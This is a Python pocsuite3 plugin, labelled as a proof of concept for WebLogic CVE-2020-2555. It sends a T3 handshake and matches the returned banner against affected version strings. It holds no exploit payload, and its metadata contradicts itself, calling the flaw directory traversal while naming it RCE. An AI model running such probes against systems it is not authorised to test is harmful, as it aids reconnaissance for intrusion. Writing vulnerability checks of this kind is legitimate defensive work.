#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc

from urllib.parse import urlsplit
import requests
import socket

MSG = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
VUL_NAME = "CVE-2020-2555"

def poc(url):
    weblogic_version = [b"12.1.3.0.0",b"12.2.1.3.0",b"12.2.1.4.0", b"3.7.1.0"]

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((url.hostname, url.port))
    sock.send(MSG)

    res1 = sock.recv(100)
    sock.close()

    for item in weblogic_version:
        if item in res1:
            return True

    return False

class TestPOC(POCBase):
    name = 'CVE-2020-2555'
    vulID = 'CVE-2020-2555'  # https://www.seebug.org/vuldb/ssvid-97912
    author = ['ebug']
    vulType = '目录遍历'    #任意文件读取
    version = '1.0'    # default version: 1.0
    references = ['https://github.com/0nise/vuldebug/tree/master/CVE-2020-2555']
    desc = '''
            影响版本：WebLogic 12.1.3.0.0、12.2.1.3.0、12.2.1.4.0
           '''
    vulDate = '2020-11-23'
    createDate = '2020-11-23'
    updateDate = '2020-11-23'
    appName = 'Weblogic RCE'
    appVersion = '3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        if poc(urlsplit(self.url)):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+ 'OracleWeblogic_RCE_CVE-2020-2555' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register_poc(TestPOC)
